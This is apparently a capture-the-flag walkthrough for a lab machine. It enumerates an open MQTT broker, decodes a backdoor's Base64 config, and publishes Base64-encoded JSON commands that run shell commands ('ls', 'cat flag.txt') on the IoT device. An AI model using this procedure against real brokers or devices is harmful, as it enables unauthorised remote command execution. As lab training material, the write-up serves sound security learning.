# Scenario

John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?

**Note**: the machine may take 3-5 minutes to fully boot.

# Enumeration

## \[+] 10.10.37.7 - bugged.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.37.7 bugged.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.37.7
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

After the scan has been completed, we'll only find port 1883 open which is the default port for [MQ Telemetry Transport (MQTT)](https://mqtt.org/) protocol that IoT devices mainly use. We can also see some of the name/location and status of the device from our Nmap report.

## \[+] Port 1883 - MQTT

We can look up the MQTT protocol on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto) on how we can approach on pentesting this protocol.

First, we'll have to download a shell to interact with the MQTT protocol. I used [this Python-based version](https://github.com/bapowell/python-mqtt-client-shell). Then run the script using Python:

```sh
python mqtt_client_shell.py
```

In the MQTT shell, we have to set our connection to `bugged.thm` then run the `connect` command:

```sh
connection
host bugged.thm
connect
```

After a moment we should receive a connection:

In order to see the data that is being sent by the IoT devices, we will have to run the `subscribe` command. The following will subscribe us to all channels where we can see all of the IoT devices communications:

```sh
subscribe "#"
```

Looking at the following incoming logs closely shows a Base64 encoded string with the word "config" in the topic:

![f7ef00d44ae7bed95304b638ae8be93a.png](/resources/8a35dca5becd473f88cdcfe7250ee9d0.png)

We can paste this into [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64\('A-Za-z0-9%2B/%3D',true,false\)\&input=J2V5SnBaQ0k2SW1Oa1pERmlNV013TFRGak5EQXROR0l3WmkwNFpUSXlMVFl4WWpNMU56VTBPR0kzWkNJc0luSmxaMmx6ZEdWeVpXUmZZMjl0YldGdVpITWlPbHNpU0VWTVVDSXNJa05OUkNJc0lsTlpVeUpkTENKd2RXSmZkRzl3YVdNaU9pSlZOSFo1Y1U1c1VYUm1MekIyYjNwdFlWcDVURlF2TVRWSU9WUkdOa05JWnk5d2RXSWlMQ0p6ZFdKZmRHOXdhV01pT2lKWVJESnlabEk1UW1WNkwwZHhUWEJTVTBWdlltZ3ZWSFpNVVdWb1RXY3dSUzl6ZFdJaWZRPT0nCg) to decode the string:

```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

Now we have more information about this IoT device. We have the ID, the commands we can use, the pub and sub topics which will contain more information on what this device is doing.

Let's try to communicate with this device using the MQTT shell. First, we'll close our current connection and reconnect:

```sh
exit
connect
```

Next, we'll subscribe to the three new channels we found related to this IoT device:

```sh
subscribe yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config
subscribe U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
subscribe XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub
```

To use the commands we found, we have to start with the `publish` command then the name of the channel and the command. Here we will send the `HELP` command to the `XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub` channel:

```sh
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub HELP
```

After decoding the response from sending the `HELP` command, we receive an error but now we know what format we need to use to successfully execute commands:

![26fb84fedf114a0021f83f79cb58e347.png](/resources/8a61ecf12cd44ba89e9c1003ff449848.png)

```plaintext
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

Let's try to send the `ls` command to see if we can execute any system commands. The ID of the device can be found earlier when we decoded the first base64 message, `cmd` tells the device we want to run a system command and the `arg` is where we enter the command we want to run:

```json
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```

Then, we use [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64\('A-Za-z0-9%2B/%3D'\)\&input=eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAid2hvYW1pIn0) to encode it into base64:

```plaintext
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
```

Back to the MQTT shell, we can now send our command to the IoT device:

```sh
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
```

The decoded response we get from the server:

```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}
```

To read the flag, we have to change our command from `ls` to `cat flag.txt` and base64 encode it again:

```json
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}
```

Base64 encoded:

```plaintext
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
```

MQTT command:

```sh
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
```

Response from the server:

```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{[...]}\n"}
```
